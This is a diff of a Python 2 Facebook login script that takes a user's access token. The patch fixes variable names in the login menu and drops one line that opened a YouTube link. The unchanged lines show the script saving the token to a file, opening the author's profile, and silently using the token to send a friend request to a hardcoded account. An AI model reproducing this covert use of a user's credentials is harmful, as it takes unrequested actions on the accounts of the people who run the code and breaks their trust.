@@ -177,15 +177,15 @@ def methodlogin():
     print ("[2] Login With Access Token")
     print ("[0] Back")
     print
-    msuk = raw_input('⌯⌯⌯⌯⌯⋙ ')
-    if hop == '':
+    hos = raw_input('⌯⌯⌯⌯⌯⋙ ')
+    if hos == '':
         print ("[!] Fill in Correctly")
         methodlogin()
-    elif hopz == '1':
+    elif hos == '1':
         login()
-    elif hopz == '2':
+    elif hos == '2':
         tokenz()
-    elif hopz == '0':
+    elif hos == '0':
         keluar()
     else:
         print ("[!] Fill in Correctly")
@@ -201,9 +201,9 @@ def tokenz():
         otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
         a = json.loads(otw.text)
         nama = a['name']
-        zedd = open('login.txt', 'w')
-        zedd.write(toket)
-        zedd.close()
+        hopa = open('login.txt', 'w')
+        hopa.write(toket)
+        hopa.close()
         print '\x1b[1;92m[\xe2\x9c\x93] Login Success {^_^} '
         os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
         time.sleep(1)
@@ -253,7 +253,6 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
